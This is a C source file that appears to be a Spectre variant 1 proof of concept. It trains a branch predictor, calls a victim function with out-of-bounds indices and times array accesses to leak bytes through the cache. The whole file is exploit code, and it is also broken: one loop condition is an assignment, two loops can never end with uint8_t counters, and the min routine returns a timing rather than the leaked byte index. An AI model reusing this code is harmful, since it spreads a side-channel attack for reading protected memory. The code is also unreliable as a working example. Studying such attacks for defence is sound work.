#include <stdio.h>
#include <stdint.h>

#include "cache.h"

#define PAGE_SZ 512
#define ARRAY1_SZ 16
#define TRAIN_TIMES 1000
uint8_t array1[2345];
uint8_t array2[256 * PAGE_SZ];

uint64_t results[256];
uint8_t min(uint64_t* results, uint64_t sz){
    uint64_t minVal = ~0;
    for (uint64_t i = 0; i < sz; ++i){
        if (minVal > results[i]){
            minVal = results[i];
        }
    }
    return minVal;
}



uint8_t dummy = 0;
void victimFunc(uint64_t idx){
    if (idx < ARRAY1_SZ){
        dummy = array2[array1[idx] * PAGE_SZ];
    }
}


int main(void){
    for(uint64_t attackIdx = ARRAY1_SZ; attackIdx < ~0; ++attackIdx){
        // make sure array you read from is not in the cache
        flushCache(array2, sizeof(array2));
        
        // train the BP to predice that the if will go through
        for(uint8_t trainIdx = 0; trainIdx = TRAIN_TIMES; ++trainIdx){
            victimFunc(trainIdx % ARRAY1_SZ);
        }

        // call the function with bad values
        victimFunc(attackIdx);

        // read out array 2 and see the hit secret value
        for (uint8_t i = 0; i < 256; ++i){
            uint64_t start = readTime();
            uint8_t dummy = array2[i*PAGE_SZ];
            uint64_t end = readTime();
        
            results[i] = end - start;
        }
        
        // Note: Could do this using a threshold value for a hit
        uint8_t secret = min(results, 256);
    }

    return 0;
}
